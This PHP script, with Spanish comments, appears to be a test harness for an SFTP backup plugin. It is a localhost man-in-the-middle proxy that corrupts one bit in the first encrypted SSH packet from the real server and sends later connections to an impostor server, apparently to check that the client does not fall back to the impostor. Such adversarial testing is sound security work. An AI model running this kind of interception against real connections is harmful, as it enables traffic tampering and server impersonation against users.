<?php
/**
 * Atacante en la red para backups-sftp-phpseclib.php (caso i, revisión H1; copia del proxy de la revisión adversaria): la PRIMERA conexión va al servidor real (A) y sólo voltea un bit del largo
 * del primer paquete cifrado que A manda tras NEWKEYS; las siguientes van al impostor (B), sin tocar nada.
 * Uso: php mitm-proxy.php <puerto-proxy> <puerto-A> <puerto-B> <registro>
 */
list( , $listen, $port_a, $port_b, $log ) = $argv;
$server = stream_socket_server( 'tcp://127.0.0.1:' . (int) $listen, $errno, $errstr );
if ( ! $server ) { file_put_contents( $log, "no escucha: $errstr\n", FILE_APPEND ); exit( 1 ); }
$note = function( $text ) use ( $log ) { file_put_contents( $log, date( 'H:i:s' ) . ' ' . $text . "\n", FILE_APPEND ); };
$note( 'escuchando' );
$pairs = array();
$count = 0;
$deadline = time() + 300;
while ( time() < $deadline ) {
	$read = array( $server );
	foreach ( $pairs as $p ) { $read[] = $p['client']; $read[] = $p['up']; }
	$w = $e = null;
	if ( false === @stream_select( $read, $w, $e, 1 ) ) break;
	foreach ( $read as $sock ) {
		if ( $sock === $server ) {
			$client = @stream_socket_accept( $server, 1 );
			if ( ! $client ) continue;
			$count++;
			$target = 1 === $count ? (int) $port_a : (int) $port_b;
			$up = stream_socket_client( 'tcp://127.0.0.1:' . $target, $errno, $errstr, 5 );
			$note( "conexión $count → " . ( 1 === $count ? 'A (real)' : 'B (impostor)' ) . " :$target" );
			$pairs[ $count ] = array( 'client' => $client, 'up' => $up, 'corrupt' => 1 === $count, 'phase' => 'ident', 'buf' => '' );
			continue;
		}
		foreach ( $pairs as $id => &$p ) {
			if ( $sock !== $p['client'] && $sock !== $p['up'] ) continue;
			$data = @fread( $sock, 65536 );
			if ( false === $data || ( '' === $data && feof( $sock ) ) ) {
				@fclose( $p['client'] ); @fclose( $p['up'] );
				$note( "conexión $id cerrada" );
				unset( $pairs[ $id ] );
				break;
			}
			if ( $sock === $p['client'] ) { fwrite( $p['up'], $data ); break; }
			if ( ! $p['corrupt'] || 'pass' === $p['phase'] ) { fwrite( $p['client'], $data ); break; }
			$p['buf'] .= $data;
			$out = '';
			while ( true ) {
				if ( 'ident' === $p['phase'] ) {
					$nl = strpos( $p['buf'], "\n" );
					if ( false === $nl ) break;
					$out .= substr( $p['buf'], 0, $nl + 1 );
					$p['buf'] = (string) substr( $p['buf'], $nl + 1 );
					$p['phase'] = 'clear';
					continue;
				}
				if ( 'clear' === $p['phase'] ) {
					if ( strlen( $p['buf'] ) < 6 ) break;
					$length = unpack( 'N', substr( $p['buf'], 0, 4 ) )[1];
					if ( strlen( $p['buf'] ) < 4 + $length ) break;
					$type = ord( $p['buf'][5] );
					$out .= substr( $p['buf'], 0, 4 + $length );
					$p['buf'] = (string) substr( $p['buf'], 4 + $length );
					if ( 21 === $type ) { $p['phase'] = 'flip'; $note( 'NEWKEYS de A visto: se corromperá el siguiente paquete' ); }
					continue;
				}
				if ( 'flip' === $p['phase'] ) {
					if ( '' === $p['buf'] ) break;
					$p['buf'][0] = chr( ord( $p['buf'][0] ) ^ 0x80 );
					$note( 'bit alto del largo del primer paquete cifrado de A volteado' );
					$out .= $p['buf'];
					$p['buf'] = '';
					$p['phase'] = 'pass';
				}
				break;
			}
			if ( '' !== $out ) fwrite( $p['client'], $out );
			break;
		}
		unset( $p );
	}
}
